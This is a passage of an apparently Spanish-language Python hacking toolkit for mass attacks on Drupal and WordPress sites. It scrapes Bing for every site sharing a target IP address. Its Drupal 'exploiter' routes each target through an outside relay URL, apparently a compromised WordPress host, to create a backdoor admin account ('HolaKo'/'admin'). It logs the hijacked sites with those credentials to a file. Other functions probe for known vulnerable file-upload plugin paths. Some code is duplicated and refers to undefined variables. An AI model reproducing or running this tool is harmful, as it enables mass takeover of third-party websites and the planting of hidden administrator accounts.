                site = urlpa.netloc

                print ("[+] Testing At " + site)
                resp = urllib.urlopen(
                    'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                read = resp.read()
                if "User : HolaKo" in read:
                    print ("Exploit found =>" + site)

                    print ("user:HolaKo\npass:admin")
                    a = open('up.txt', 'a')
                    a.write(site + '\n')
                    a.write("user:" + user + "\npass:" + pwd + "\n")
                else:
                    print ("[-] Expl Not Found :( ")

            except Exception as ex:
                print (ex)
                sys.exit(0)

        # Drupal Server ExtraCtor


def getdrupal():
    ip = input('Ingrese la Ip :  ')
    page = 1
    sites = list()
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + \
            "+node&go=Valider&qs=ds&form=QBRE&first=" + str(page)
        req = urllib.Request(url)
        opreq = urllib.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            split = urlparse(url)
            site = split.netloc
            if site not in sites:
                print (site)
                sites.append(site)

        # Drupal Mass List Exploiter


def drupallist():
    listop = input("Ingrese la lista Txt ~# ")
    fileopen = open(listop, 'r')
    content = fileopen.readlines()
    for i in content:
        url = i.strip()
        try:
            openurl = urllib.urlopen(
                'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
            readcontent = openurl.read()
            if "Success" in readcontent:
                print ("[+]Success =>" + url)
                print ("[-]username:HolaKo\n[-]password:admin")
                save = open('drupal.txt', 'a')
                save.write(
                    url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")

            else:
                print (i + "=> exploit not found ")
        except Exception as ex:
            print (ex)


def maine():

    print (minu)
    choose = input("seleccione una opción : ")
    while True:

        if choose == "1":
            drupal()
        if choose == "2":
            getdrupal()
        if choose == "3":
            drupallist()
        if choose == "99":
            clearScr()
            menu()
        con = input('Continuar [Y/n] -> ')
        if con[0].upper() == 'N':
            exit()
        if con[0].upper() == 'Y':
            
            maine()


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_joomla(sites):
    joomla = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'administrator').getcode() == 200:
                joomla.append(site)
        except:
            pass

    return joomla


def wppjmla():

    ipp = input('Ingrese dirección IP : ')
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print (ss)
    print ('[+] Found ! ', len(wordpress), ' Wordpress Websites')
    print ('-' * 30 + '\n')
    for ss in joomla:
        print (ss)

    print ('[+] Found ! ', len(joomla), ' Joomla Websites')

    print ('\n')
# initialise the fscan function


#class dzz():
#    def __init__(self):
#        clearScr()
#        aaa = input("Target IP : ")
#        Fscan(aaa)
############################


class bcolors:
    HEADER = ''
    OKBLUE = ''
    OKGREEN = ''
    WARNING = ''
    FAIL = ''
    ENDC = ''
    CYAN = ''


class colors():
    PURPLE = ''
    CYAN = ''
    DARKCYAN = ''
    BLUE = ''
    GREEN = ''
    YELLOW = ''
    RED = ''
    BOLD = ''
    ENDC = ''





def checksqli(sqli):
    responsetwo = urllib.urlopen(sqli).read()
    find = re.findall('type="file"', responsetwo)
    if find:
        print(" Found ==> " + sqli)



def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_wpstorethemeremotefileupload(sites):
    wpstorethemeremotefileupload = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-content/themes/WPStore/upload/index.php').getcode() == 200:
                wpstorethemeremotefileupload.append(site)
        except:
            pass

    return wpstorethemeremotefileupload


def check_wpcontactcreativeform(sites):
    wpcontactcreativeform = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200:
                wpcontactcreativeform.append(site)
        except:
            pass

    return wpcontactcreativeform


def check_wplazyseoplugin(sites):
    wplazyseoplugin = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200:
                wplazyseoplugin.append(site)
        except:
            pass

    return wplazyseoplugin


def check_wpeasyupload(sites):
    wpeasyupload = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200:
                wpeasyupload.append(site)
        except:
            pass

    return wpeasyupload


def check_wpsymposium(sites):
    wpsymposium = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-symposium/server/file_upload_form.php').getcode() == 200:
                wpsymposium.append(site)
        except:
            pass

    return wpsymposium


def wpminiscanner():
    ip = input('Ingrese la dirección IP : ')
    sites = bing_all_grabber(str(ip))
    wordpress = check_wordpress(sites)
    wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
    wpcontactcreativeform = check_wpcontactcreativeform(sites)
    wplazyseoplugin = check_wplazyseoplugin(sites)
    wpeasyupload = check_wpeasyupload(sites)
    wpsymposium = check_wpsymposium(sites)
    for ss in wordpress:
        print (ss)
    print ('[*] Encontrar, ', len(wordpress), ' wordpress sites.')
    print ('-' * 30 + '\n')
    for ss in wpstorethemeremotefileupload:
        print (ss)
    print ('[*] Encontrar, ', len(wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.')
    print ('-' * 30 + '\n')
    for ss in wpcontactcreativeform:
        print (ss)
    print ('[*] Encontrar, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.')
    print ('-' * 30 + '\n')
    for ss in wplazyseoplugin:
        print (ss)
    print ('[*] Encontrar, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.')
    print ('-' * 30 + '\n')
    for ss in wpeasyupload:
        print (ss)
    print ('[*] Encontrar, ', len(wpeasyupload), ' wp_easyupload exploit.')
    print ('-' * 30 + '\n')
    for ss in wpsymposium:
        print (ss)

    print ('[*] Encontrar, ', len(wpsymposium), ' wp_sympsiup exploit.')

    print ('\n')
############################


if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(" Finishing up...\r"),
        time.sleep(0.25)
